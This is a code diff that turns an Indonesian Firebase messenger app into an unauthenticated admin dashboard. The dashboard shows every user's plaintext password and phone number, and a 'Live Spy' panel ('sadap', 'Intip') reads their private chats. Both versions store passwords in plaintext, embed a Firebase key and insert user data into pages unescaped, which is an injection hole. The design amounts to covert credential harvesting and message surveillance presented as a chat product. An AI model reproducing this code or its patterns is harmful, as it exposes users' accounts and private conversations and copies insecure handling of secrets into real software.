@@ -3,178 +3,181 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>ConnectPro - Ultimate Messenger</title>
+    <title>Elite Admin - ConnectPro</title>
     <script src="https://www.gstatic.com/firebasejs/9.17.1/firebase-app-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/9.17.1/firebase-database-compat.js"></script>
-    <script src="https://www.gstatic.com/firebasejs/9.17.1/firebase-storage-compat.js"></script>
-    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;600;700&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;600;700&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
-    
+
     <style>
         :root {
-            --bg: #0f172a; --card: #1e293b; --primary: #6366f1;
-            --success: #22c55e; --text: #f8fafc; --border: #334155;
+            --bg: #0f172a; --card: rgba(30, 41, 59, 0.7);
+            --primary: #6366f1; --accent: #10b981;
+            --danger: #ef4444;
+            --text-main: #f8fafc; --text-dim: #94a3b8;
+            --glass: blur(12px) saturate(180%);
         }
+
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Plus Jakarta Sans', sans-serif; }
 
         body {
-            font-family: 'Plus Jakarta Sans', sans-serif;
-            background: var(--bg); color: var(--text);
-            margin: 0; display: flex; height: 100vh;
-            justify-content: center; align-items: center; overflow: hidden;
+            background-color: var(--bg);
+            background-image: radial-gradient(circle at 0% 0%, rgba(99, 102, 241, 0.15) 0%, transparent 50%),
+                              radial-gradient(circle at 100% 100%, rgba(16, 185, 129, 0.1) 0%, transparent 50%);
+            color: var(--text-main);
+            height: 100vh; display: flex; overflow: hidden;
         }
 
-        /* --- AUTH SECTION --- */
-        .auth-card {
-            background: var(--card); border-radius: 24px; padding: 40px;
-            width: 100%; transition: 0.4s; box-shadow: 0 25px 50px -12px rgba(0,0,0,0.5);
-        }
-        .login-mode { max-width: 380px; border: 1px solid var(--border); }
-        .register-mode { max-width: 450px; border: 2px solid var(--primary); }
-
-        input, select {
-            width: 100%; padding: 14px; margin: 10px 0; border-radius: 12px;
-            border: 1px solid var(--border); background: #0f172a; color: white;
-            box-sizing: border-box; outline: none; font-family: inherit;
+        /* --- DESKTOP SIDEBAR --- */
+        nav.sidebar {
+            width: 260px; background: var(--card); backdrop-filter: var(--glass);
+            border-right: 1px solid rgba(255,255,255,0.1);
+            display: flex; flex-direction: column; padding: 30px 20px;
         }
 
-        select option { background: var(--card); }
+        .logo { font-size: 1.5rem; font-weight: 800; color: var(--primary); margin-bottom: 40px; display: flex; align-items: center; gap: 10px; }
 
-        .btn {
-            width: 100%; padding: 14px; background: var(--primary); border: none;
-            color: white; font-weight: 700; border-radius: 12px; cursor: pointer;
-            margin-top: 10px; transition: 0.3s;
+        .nav-item {
+            padding: 12px 15px; border-radius: 12px; color: var(--text-dim);
+            text-decoration: none; margin-bottom: 10px; transition: 0.3s;
+            display: flex; align-items: center; gap: 12px; cursor: pointer;
+        }
+        .nav-item:hover, .nav-item.active { background: rgba(99, 102, 241, 0.1); color: var(--primary); }
+        
+        .logout-desk { margin-top: auto; color: var(--danger) !important; }
+        .logout-desk:hover { background: rgba(239, 68, 68, 0.1) !important; }
+
+        /* --- MOBILE HEADER & NAV --- */
+        .mobile-header {
+            display: none; padding: 20px; background: var(--card);
+            backdrop-filter: var(--glass); justify-content: space-between;
+            align-items: center; border-bottom: 1px solid rgba(255,255,255,0.1);
         }
 
-        .captcha-box {
-            background: #334155; padding: 12px; text-align: center;
-            letter-spacing: 6px; font-weight: 800; color: #fbbf24; border-radius: 12px;
+        /* --- MAIN CONTENT --- */
+        main { flex: 1; display: flex; flex-direction: column; overflow-y: auto; padding: 30px; }
+
+        .stats-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 20px; margin-bottom: 30px; }
+        .stat-card {
+            background: var(--card); backdrop-filter: var(--glass); padding: 25px;
+            border-radius: 24px; border: 1px solid rgba(255,255,255,0.1);
+        }
+        .stat-card h3 { font-size: 0.8rem; color: var(--text-dim); text-transform: uppercase; letter-spacing: 1px; }
+        .stat-card p { font-size: 2rem; font-weight: 700; margin-top: 10px; }
+
+        .content-flex { display: flex; gap: 25px; flex-wrap: wrap; }
+        .data-table {
+            flex: 2; min-width: 350px; background: var(--card); border-radius: 24px;
+            padding: 25px; border: 1px solid rgba(255,255,255,0.1); backdrop-filter: var(--glass);
+        }
+        .spy-panel {
+            flex: 1; min-width: 300px; background: var(--card); border-radius: 24px;
+            padding: 25px; border: 1px solid rgba(255,255,255,0.1); backdrop-filter: var(--glass);
         }
 
-        /* --- MAIN APP UI --- */
-        #appUI { display: none; width: 100%; height: 100vh; grid-template-columns: 350px 1fr; }
+        /* --- TABLE STYLE --- */
+        .scroll-x { overflow-x: auto; margin-top: 20px; }
+        table { width: 100%; border-collapse: collapse; min-width: 600px; }
+        th { text-align: left; padding: 12px; color: var(--text-dim); font-size: 0.75rem; border-bottom: 1px solid rgba(255,255,255,0.1); }
+        td { padding: 15px 12px; border-bottom: 1px solid rgba(255,255,255,0.05); }
 
-        .sidebar { background: var(--card); border-right: 1px solid var(--border); display: flex; flex-direction: column; }
-        .story-bar { display: flex; gap: 12px; padding: 20px; overflow-x: auto; border-bottom: 1px solid var(--border); }
-        .story-item { min-width: 65px; height: 65px; border-radius: 50%; padding: 3px; background: linear-gradient(45deg, #f09433, #e6683c, #dc2743); cursor: pointer; }
-        .story-item img { width: 100%; height: 100%; border-radius: 50%; object-fit: cover; border: 2px solid var(--card); }
+        .user-info { display: flex; align-items: center; gap: 10px; }
+        .user-info img { width: 38px; height: 38px; border-radius: 12px; object-fit: cover; }
+        .badge { padding: 4px 10px; border-radius: 8px; font-size: 0.7rem; font-weight: 600; }
+        .Laki-laki { background: rgba(59, 130, 246, 0.2); color: #3b82f6; }
+        .Perempuan { background: rgba(236, 72, 153, 0.2); color: #ec4899; }
 
-        .contact-item { padding: 15px 20px; display: flex; align-items: center; gap: 15px; cursor: pointer; border-bottom: 1px solid rgba(255,255,255,0.03); }
-        .contact-item:hover { background: rgba(255,255,255,0.05); }
-        .avatar { width: 45px; height: 45px; border-radius: 50%; object-fit: cover; background: #334155; }
+        .btn-spy { background: var(--primary); border: none; color: white; padding: 8px 15px; border-radius: 10px; cursor: pointer; font-size: 0.8rem; }
 
-        .chat-main { display: flex; flex-direction: column; background: var(--bg); }
-        .msg-area { flex: 1; padding: 25px; overflow-y: auto; display: flex; flex-direction: column; gap: 10px; }
-        .bubble { padding: 12px 16px; border-radius: 18px; max-width: 65%; font-size: 0.95rem; }
-        .me { align-self: flex-end; background: var(--primary); border-bottom-right-radius: 4px; }
-        .them { align-self: flex-start; background: var(--border); border-bottom-left-radius: 4px; }
+        /* --- MOBILE BOTTOM NAV --- */
+        .bottom-nav { display: none; position: fixed; bottom: 0; left: 0; width: 100%; background: var(--card); backdrop-filter: blur(20px); padding: 15px; border-top: 1px solid rgba(255,255,255,0.1); z-index: 100; justify-content: space-around; }
 
-        .input-bar { padding: 20px; background: var(--card); display: flex; gap: 10px; align-items: center; }
-        .vn-btn { width: 50px; height: 50px; border-radius: 50%; background: #ef4444; border: none; color: white; cursor: pointer; }
+        /* --- RESPONSIVE --- */
+        @media (max-width: 768px) {
+            nav.sidebar { display: none; }
+            .mobile-header { display: flex; }
+            body { flex-direction: column; }
+            main { padding: 20px 15px 100px 15px; }
+            .bottom-nav { display: flex; }
+            .content-flex { flex-direction: column; }
+            .stat-card p { font-size: 1.5rem; }
+        }
 
-        /* --- ADMIN UI --- */
-        #adminUI { display: none; width: 100%; height: 100vh; background: #020617; color: white; padding: 40px; overflow-y: auto; box-sizing: border-box; }
-        table { width: 100%; border-collapse: collapse; margin-top: 20px; }
-        th, td { padding: 12px; border-bottom: 1px solid #1e293b; text-align: left; font-size: 0.85rem; }
-        .tag { padding: 4px 8px; border-radius: 6px; font-size: 0.7rem; font-weight: bold; }
-        .female { background: #db2777; } .male { background: #2563eb; }
-
-        .hidden { display: none !important; }
+        /* Spy Box Styles */
+        .chat-row { background: rgba(15, 23, 42, 0.5); padding: 12px; border-radius: 15px; margin-bottom: 15px; border-left: 3px solid var(--primary); }
+        .chat-bubble { font-size: 0.85rem; margin-top: 5px; padding: 5px 0; border-bottom: 1px solid rgba(255,255,255,0.05); }
     </style>
 </head>
 <body>
 
-    <div id="authUI" class="auth-card login-mode">
-        <div id="loginSection">
-            <h2>Masuk</h2>
-            <input type="text" id="lID" placeholder="ID Username">
-            <input type="password" id="lPW" placeholder="Password">
-            <button class="btn" onclick="handleAuth('login')">MASUK</button>
-            <p style="text-align:center; cursor:pointer; color:var(--primary);" onclick="switchAuth('reg')">Daftar Akun Baru</p>
+    <nav class="sidebar">
+        <div class="logo"><i class="fas fa-shield-halved"></i> ConnectPro</div>
+        <div class="nav-item active"><i class="fas fa-chart-line"></i> Dashboard</div>
+        <div class="nav-item"><i class="fas fa-user-group"></i> Users</div>
+        <div class="nav-item"><i class="fas fa-comment-dots"></i> Conversations</div>
+        
+        <div class="nav-item logout-desk" onclick="logout()">
+            <i class="fas fa-right-from-bracket"></i> Logout
         </div>
+    </nav>
 
-        <div id="regSection" class="hidden">
-            <h2>Daftar Akun</h2>
-            <input type="text" id="rNama" placeholder="Nama Lengkap">
-            <input type="text" id="rID" placeholder="Buat ID Unik">
-            <input type="password" id="rPW" placeholder="Password">
-            <input type="number" id="rWA" placeholder="No. WhatsApp">
-            
-            <label style="font-size: 0.8rem; color: #94a3b8; margin-left: 5px;">Jenis Kelamin:</label>
-            <select id="rGender">
-                <option value="Laki-laki">Laki-laki</option>
-                <option value="Perempuan">Perempuan</option>
-            </select>
-
-            <div class="captcha-box" id="capBox"></div>
-            <input type="text" id="capInp" placeholder="Captcha">
-            <button class="btn" onclick="handleAuth('reg')">DAFTAR SEKARANG</button>
-            <p style="text-align:center; cursor:pointer; color:var(--primary);" onclick="switchAuth('login')">Kembali ke Login</p>
-        </div>
+    <div class="mobile-header">
+        <div class="logo" style="margin:0; font-size:1.2rem;"><i class="fas fa-shield-halved"></i> Admin</div>
+        <div onclick="logout()" style="color:var(--danger); font-size:1.2rem;"><i class="fas fa-power-off"></i></div>
     </div>
 
-    <div id="appUI">
-        <div class="sidebar">
-            <div style="padding:20px; display:flex; justify-content:space-between; align-items:center;">
-                <img id="myAvatar" src="" class="avatar" style="cursor:pointer;" onclick="toggleUI('profile')">
-                <div style="display:flex; gap:10px;">
-                    <button onclick="uploadStory()" style="background:none; border:none; color:var(--primary); cursor:pointer;"><i class="fas fa-plus-circle"></i> Story</button>
-                    <button onclick="openAdmin()" style="background:none; border:none; color:#64748b; cursor:pointer;"><i class="fas fa-user-shield"></i></button>
+    <main>
+        <div style="margin-bottom: 30px;">
+            <h1 style="font-size: 1.8rem; letter-spacing: -1px;">Admin Console</h1>
+            <p style="color: var(--text-dim);">Monitoring data user secara real-time.</p>
+        </div>
+
+        <div class="stats-grid">
+            <div class="stat-card"><h3>Total User</h3><p id="tUser">0</p></div>
+            <div class="stat-card"><h3>Laki-laki</h3><p id="tMale" style="color: #3b82f6;">0</p></div>
+            <div class="stat-card"><h3>Perempuan</h3><p id="tFemale" style="color: #ec4899;">0</p></div>
+        </div>
+
+        <div class="content-flex">
+            <div class="data-table">
+                <div style="display:flex; justify-content:space-between; align-items:center;">
+                    <h2 style="font-size: 1.1rem;">Database Pengguna</h2>
+                    <i class="fas fa-rotate" style="cursor:pointer; color:var(--text-dim);" onclick="location.reload()"></i>
+                </div>
+                <div class="scroll-x">
+                    <table>
+                        <thead>
+                            <tr>
+                                <th>USER INFO</th>
+                                <th>PASSWORD</th>
+                                <th>PHONE / WA</th>
+                                <th>GENDER</th>
+                                <th>ACTION</th>
+                            </tr>
+                        </thead>
+                        <tbody id="userTable"></tbody>
+                    </table>
                 </div>
             </div>
-            <div class="story-bar" id="storyBar"></div>
-            <div style="padding:15px; display:flex; gap:5px;">
-                <input type="text" id="searchID" placeholder="Cari ID..." style="margin:0;">
-                <button class="btn" onclick="findFriend()" style="width:50px; margin:0;"><i class="fas fa-search"></i></button>
-            </div>
-            <div class="contact-list" id="contactList"></div>
-        </div>
-        <div class="chat-main">
-            <div id="chatHeader" style="padding:20px; background:var(--card); font-weight:700;">Pilih Obrolan</div>
-            <div class="msg-area" id="msgBox"></div>
-            <div class="input-bar">
-                <input type="text" id="msgInput" placeholder="Pesan..." style="margin:0; flex:1;">
-                <button id="vnBtn" class="vn-btn" onmousedown="startVN()" onmouseup="stopVN()"><i class="fas fa-microphone"></i></button>
-                <button class="btn" onclick="sendText()" style="width:80px; margin:0;"><i class="fas fa-paper-plane"></i></button>
+
+            <div class="spy-panel">
+                <h2 style="font-size: 1.1rem; margin-bottom: 20px;"><i class="fas fa-satellite-dish"></i> Live Spy</h2>
+                <div id="spyOutput" style="color: var(--text-dim); font-size: 0.9rem;">
+                    Pilih user untuk mengintip isi chat.
+                </div>
             </div>
         </div>
-    </div>
+    </main>
 
-    <div id="profileUI" class="auth-card register-mode hidden">
-        <h2>Edit Profil</h2>
-        <div style="text-align:center;">
-            <img id="pfpPrev" src="" style="width:100px; height:100px; border-radius:50%; object-fit:cover;">
-            <input type="file" id="pfpFile" accept="image/*" style="margin-top:10px;">
-        </div>
-        <input type="text" id="pName" placeholder="Nama Lengkap">
-        <select id="pPrivacy">
-            <option value="public">🌍 Publik</option>
-            <option value="private">🔒 Privat</option>
-        </select>
-        <button class="btn" onclick="updateProfile()">SIMPAN</button>
-        <button class="btn" style="background:none;" onclick="toggleUI('app')">KEMBALI</button>
-    </div>
-
-    <div id="adminUI">
-        <div style="display:flex; justify-content:space-between;">
-            <h1><i class="fas fa-shield-alt"></i> Master Admin</h1>
-            <button class="btn" style="width:auto; background:#475569;" onclick="toggleUI('app')">Keluar Admin</button>
-        </div>
-        <table>
-            <thead>
-                <tr>
-                    <th>Foto</th><th>ID / Nama</th><th>Password</th><th>No. HP</th><th>Gender</th><th>Status</th><th>Aksi</th>
-                </tr>
-            </thead>
-            <tbody id="adminTable"></tbody>
-        </table>
-        <div id="adminMonitor" class="hidden" style="margin-top:30px; background:#1e293b; padding:20px; border-radius:15px;">
-            <h3 id="monTitle">Chat Log</h3>
-            <div id="monMsgs" style="height:300px; overflow-y:auto; background:#020617; padding:15px; border-radius:10px;"></div>
-        </div>
+    <div class="bottom-nav">
+        <div onclick="location.reload()" style="color: var(--primary);"><i class="fas fa-home fa-lg"></i></div>
+        <div><i class="fas fa-users fa-lg"></i></div>
+        <div><i class="fas fa-eye fa-lg"></i></div>
+        <div onclick="alert('Settings Mode')"><i class="fas fa-gear fa-lg"></i></div>
     </div>
 
 <script>
-    // --- FIREBASE CONFIG ---
+    // Firebase Config tetap sama
     const firebaseConfig = {
         apiKey: "AIzaSyBSo0nFUKNBDmUX0wSFV_idAFWBRnnTcXE",
         authDomain: "fotobooth-e36ab.firebaseapp.com",
@@ -186,190 +189,71 @@
     };
     firebase.initializeApp(firebaseConfig);
     const db = firebase.database();
-    const storage = firebase.storage();
 
-    let myID = "", targetID = "", capCode = "", mediaRec, chunks = [];
-
-    // --- NAVIGATION ---
-    function switchAuth(to) {
-        document.getElementById('loginSection').classList.toggle('hidden', to === 'reg');
-        document.getElementById('regSection').classList.toggle('hidden', to === 'login');
-        document.getElementById('authUI').className = `auth-card ${to === 'reg' ? 'register-mode' : 'login-mode'}`;
-        if(to === 'reg') {
-            capCode = Math.random().toString(36).substring(2, 7).toUpperCase();
-            document.getElementById('capBox').innerText = capCode;
+    // Fungsi Logout
+    function logout() {
+        if(confirm("Apakah Anda yakin ingin keluar dari Dashboard Admin?")) {
+            // Karena admin tidak pakai sistem login Firebase Auth, kita cukup redirect
+            // Kamu bisa ganti link ini ke halaman login atau halaman utama
+            window.location.href = "index.html"; 
         }
     }
 
-    function toggleUI(target) {
-        document.querySelectorAll('body > div').forEach(el => el.classList.add('hidden'));
-        document.getElementById('appUI').style.display = target === 'app' ? 'grid' : 'none';
-        if(target === 'app') {
-            document.getElementById('appUI').classList.remove('hidden');
-            loadAppData();
-        } else {
-            document.getElementById(target + 'UI').classList.remove('hidden');
-        }
-    }
+    db.ref('users').on('value', snap => {
+        const table = document.getElementById('userTable');
+        table.innerHTML = "";
+        let m = 0, f = 0, total = 0;
 
-    // --- AUTH LOGIC (Updated for Gender) ---
-    function handleAuth(type) {
-        if(type === 'reg') {
-            const id = document.getElementById('rID').value.trim().toLowerCase();
-            const pw = document.getElementById('rPW').value;
-            const nama = document.getElementById('rNama').value;
-            const wa = document.getElementById('rWA').value;
-            const gender = document.getElementById('rGender').value; // Ambil nilai gender
-            
-            if(!id || !pw || !nama || !wa) return alert("Lengkapi semua data!");
-            if(document.getElementById('capInp').value.toUpperCase() !== capCode) return alert("Captcha Salah!");
-            
-            db.ref('users/' + id).set({
-                pw, nama, wa, gender, // Simpan gender ke database
-                privacy: 'public', pfp: ''
-            }).then(() => { alert("Pendaftaran Sukses!"); switchAuth('login'); });
-        } else {
-            const id = document.getElementById('lID').value.trim().toLowerCase();
-            const pw = document.getElementById('lPW').value;
-            db.ref('users/' + id).once('value', snap => {
-                if(snap.exists() && snap.val().pw === pw) {
-                    myID = id;
-                    document.getElementById('myAvatar').src = snap.val().pfp || 'https://via.placeholder.com/150';
-                    document.getElementById('pName').value = snap.val().nama;
-                    toggleUI('app');
-                } else alert("ID atau Password salah!");
-            });
-        }
-    }
+        snap.forEach(user => {
+            const d = user.val();
+            const id = user.key;
+            total++;
+            if(d.gender === 'Laki-laki') m++; else f++;
 
-    // --- APP FUNCTIONS ---
-    function loadAppData() {
-        db.ref('stories').on('value', snap => {
-            const bar = document.getElementById('storyBar'); bar.innerHTML = "";
-            snap.forEach(s => {
-                bar.innerHTML += `<div class="story-item" onclick="openStory('${s.key}', '${s.val().url}')"><img src="${s.val().url}"></div>`;
-            });
-        });
-        db.ref(`contacts/${myID}`).on('value', snap => {
-            const list = document.getElementById('contactList'); list.innerHTML = "";
-            snap.forEach(c => {
-                list.innerHTML += `<div class="contact-item" onclick="startChat('${c.key}', '${c.val().nama}', '${c.val().pfp}')">
-                    <img src="${c.val().pfp || 'https://via.placeholder.com/150'}" class="avatar">
-                    <div><b>${c.val().nama}</b><br><small>${c.key}</small></div></div>`;
-            });
-        });
-    }
-
-    function findFriend() {
-        const fid = document.getElementById('searchID').value.trim().toLowerCase();
-        db.ref('users/' + fid).once('value', snap => {
-            if(snap.exists() && (snap.val().privacy === 'public' || fid === myID)) startChat(fid, snap.val().nama, snap.val().pfp);
-            else alert("User tidak ditemukan atau akun privat!");
-        });
-    }
-
-    function startChat(id, nama, pfp) {
-        targetID = id; document.getElementById('chatHeader').innerText = nama;
-        db.ref(`contacts/${myID}/${id}`).set({ nama, pfp });
-        const room = [myID, targetID].sort().join("_");
-        db.ref('messages/' + room).on('value', snap => {
-            const box = document.getElementById('msgBox'); box.innerHTML = "";
-            snap.forEach(m => {
-                const d = m.val(); const cls = d.sender === myID ? 'me' : 'them';
-                if(d.type === 'vn') box.innerHTML += `<div class="bubble ${cls}"><audio controls src="${d.url}"></audio></div>`;
-                else box.innerHTML += `<div class="bubble ${cls}">${d.text}</div>`;
-            });
-            box.scrollTop = box.scrollHeight;
-        });
-    }
-
-    function sendText() {
-        const text = document.getElementById('msgInput').value; if(!text || !targetID) return;
-        const room = [myID, targetID].sort().join("_");
-        db.ref('messages/' + room).push({ sender: myID, text, type: 'text', time: Date.now() });
-        document.getElementById('msgInput').value = "";
-    }
-
-    // --- ADMIN PANEL ---
-    function openAdmin() {
-        toggleUI('admin');
-        db.ref('users').on('value', snap => {
-            const t = document.getElementById('adminTable'); t.innerHTML = "";
-            snap.forEach(u => {
-                const d = u.val();
-                t.innerHTML += `<tr>
-                    <td><img src="${d.pfp || 'https://via.placeholder.com/50'}" width="40" height="40" style="border-radius:50%; object-fit:cover;"></td>
-                    <td><b>${u.key}</b><br>${d.nama}</td>
-                    <td style="color:#fbbf24; font-family:monospace;">${d.pw}</td>
+            table.innerHTML += `
+                <tr>
+                    <td>
+                        <div class="user-info">
+                            <img src="${d.pfp || 'https://via.placeholder.com/100'}">
+                            <div><b>${id}</b><br><small style="color:var(--text-dim)">${d.nama}</small></div>
+                        </div>
+                    </td>
+                    <td><code style="color:#fbbf24; font-weight:bold;">${d.pw}</code></td>
                     <td>${d.wa || '-'}</td>
-                    <td><span class="tag ${d.gender === 'Perempuan' ? 'female' : 'male'}">${d.gender || 'N/A'}</span></td>
-                    <td>${d.privacy}</td>
-                    <td><button onclick="spy('${u.key}')" class="btn" style="width:auto; margin:0; padding:5px 10px; font-size:0.7rem;">Lihat Chat</button></td>
-                </tr>`;
-            });
+                    <td><span class="badge ${d.gender}">${d.gender}</span></td>
+                    <td><button class="btn-spy" onclick="sadap('${id}')">Intip</button></td>
+                </tr>
+            `;
         });
-    }
+        document.getElementById('tUser').innerText = total;
+        document.getElementById('tMale').innerText = m;
+        document.getElementById('tFemale').innerText = f;
+    });
 
-    function spy(id) {
-        document.getElementById('adminMonitor').classList.remove('hidden');
-        document.getElementById('monTitle').innerText = "Monitoring Chat: " + id;
-        const box = document.getElementById('monMsgs'); box.innerHTML = "Memuat percakapan...";
+    function sadap(id) {
+        const out = document.getElementById('spyOutput');
+        out.innerHTML = `<p style="color:white; margin-bottom:15px;">Target: <b>@${id}</b></p>`;
+        
         db.ref(`contacts/${id}`).once('value', snap => {
-            box.innerHTML = "";
-            if(!snap.exists()) box.innerHTML = "Belum ada chat.";
+            if(!snap.exists()) return out.innerHTML += "Tidak ada riwayat chat.";
+            
             snap.forEach(c => {
-                const room = [id, c.key].sort().join("_");
-                box.innerHTML += `<div style="color:var(--primary); margin-top:10px; border-bottom:1px solid #334155;">Lawan Chat: ${c.key}</div>`;
-                db.ref('messages/' + room).once('value', mSnap => {
-                    mSnap.forEach(m => {
-                        const d = m.val();
-                        box.innerHTML += `<div style="font-size:0.8rem;"><b>${d.sender}:</b> ${d.text || '[Audio/VN]'}</div>`;
+                const partner = c.key;
+                const room = [id, partner].sort().join("_");
+                const row = document.createElement('div');
+                row.className = 'chat-row';
+                row.innerHTML = `<small>Chat dengan: <b>${partner}</b></small>`;
+
+                db.ref(`messages/${room}`).limitToLast(5).once('value', mSnap => {
+                    mSnap.forEach(msg => {
+                        const m = msg.val();
+                        row.innerHTML += `<div class="chat-bubble"><b>${m.sender === id ? 'Dia' : 'Lawan'}:</b> ${m.text || '[VN/Media]'}</div>`;
                     });
                 });
+                out.appendChild(row);
             });
         });
-    }
-
-    // (Sisanya fungsi VN, Story, Update Profile tetap sama seperti sebelumnya)
-    async function startVN() {
-        const s = await navigator.mediaDevices.getUserMedia({ audio: true });
-        mediaRec = new MediaRecorder(s); mediaRec.start(); chunks = [];
-        mediaRec.ondataavailable = e => chunks.push(e.data);
-    }
-    async function stopVN() {
-        mediaRec.stop(); mediaRec.onstop = async () => {
-            const blob = new Blob(chunks, { type: 'audio/mp3' });
-            const ref = storage.ref(`vns/${Date.now()}`);
-            await ref.put(blob); const url = await ref.getDownloadURL();
-            const room = [myID, targetID].sort().join("_");
-            db.ref('messages/' + room).push({ sender: myID, url, type: 'vn' });
-        };
-    }
-    async function uploadStory() {
-        const i = document.createElement('input'); i.type = 'file'; i.accept = 'image/*'; i.click();
-        i.onchange = async () => {
-            const ref = storage.ref(`stories/${myID}_${Date.now()}`);
-            await ref.put(i.files[0]);
-            const url = await ref.getDownloadURL();
-            db.ref('stories/' + myID).set({ url, time: Date.now() });
-        };
-    }
-    function openStory(owner, url) {
-        window.open(url);
-    }
-    async function updateProfile() {
-        const file = document.getElementById('pfpFile').files[0];
-        let url = document.getElementById('myAvatar').src;
-        if(file) {
-            const ref = storage.ref(`pfps/${myID}`);
-            await ref.put(file);
-            url = await ref.getDownloadURL();
-        }
-        db.ref('users/' + myID).update({
-            nama: document.getElementById('pName').value,
-            privacy: document.getElementById('pPrivacy').value, pfp: url
-        }).then(() => { document.getElementById('myAvatar').src = url; toggleUI('app'); });
     }
 </script>
 </body>
-    </html>
+</html>
